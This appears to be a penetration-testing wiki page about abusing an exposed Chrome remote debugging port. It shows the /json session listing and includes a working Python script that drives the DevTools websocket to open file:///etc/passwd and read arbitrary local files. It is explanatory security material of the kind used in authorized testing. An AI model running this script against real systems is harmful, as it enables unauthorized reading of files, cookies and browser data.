---
description: The Chrome DevTools protocol for Remote Debugging
---

# Chrome Remote DevTools

When `google-chrome` is launched with remote debugging enabled, this is usually on port 9222. But it can be changed with the `--remote-debugging-port=` argument when it is started.&#x20;

When this port is accessible, you can connect to it with the [DevTools HTTP Protocol](https://chromedevtools.github.io/devtools-protocol/#endpoints) in order to make the browser do certain things. You can debug the currently viewed site, meaning reading any data, like HTML, cookies, or other stored data, and execute JavaScript in the console. As well as being able to browse to and **read arbitrary files** on the system.&#x20;

Get a list of sessions by requesting `/json` endpoint:

{% code title="http://localhost:9222/json" %}
```json
[ {
  "description": "",
  "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:9222/devtools/page/DAB7FB6187B554E10B0BD18821265734",
  "id": "DAB7FB6187B554E10B0BD18821265734",
  "title": "Yahoo",
  "type": "page",
  "url": "https://www.yahoo.com/",
  "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/DAB7FB6187B554E10B0BD18821265734"
} ]
```
{% endcode %}

You can then visit the `devtoolsFrontendUrl` in your browser to get a regular GUI that you would get debugging any site. Here you can do anything normal DevTools would be able to, like executing JavaScript, reading stored data, and viewing the site.&#x20;

In the background, this will send various messages through the `webSocketDebuggerUrl`, which you can also directly access to have more control, and not be limited by the GUI. One interesting way of abusing this is to first **navigate** to a `file://` URL ([`Page.navigate`](https://chromedevtools.github.io/devtools-protocol/tot/Page/#method-navigate)), and then request the HTML content of the page using JavaScript ([`Runtime.evaluate`](https://chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-evaluate)) to read arbitrary files. You can simply connect to the websocket in Python like so:

```python
from time import sleep
import requests
import websocket
import json


def page_navigate(ws, url):
    payload = {
        "id": 1,
        "method": "Page.navigate",
        "params": {
            "url": url
        }
    }
    ws.send(json.dumps(payload))
    return json.loads(ws.recv())


def get_current_html(ws):
    payload = {
        "id": 2,
        "method": "Runtime.evaluate",
        "params": {
            "expression": "document.documentElement.outerHTML"
        }
    }
    ws.send(json.dumps(payload))
    return json.loads(ws.recv())["result"]["result"]["value"]


targets = requests.get("http://localhost:9222/json").json()
websocket_url = targets[0]["webSocketDebuggerUrl"]

ws = websocket.create_connection(websocket_url)
sleep(1)
print(page_navigate(ws, "file:///etc/passwd"))
sleep(3)
print(get_current_html(ws))
```

_Reference for this code was the_ [_Chrome Debugger metasploit module_](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/gather/chrome\_debugger.rb)__
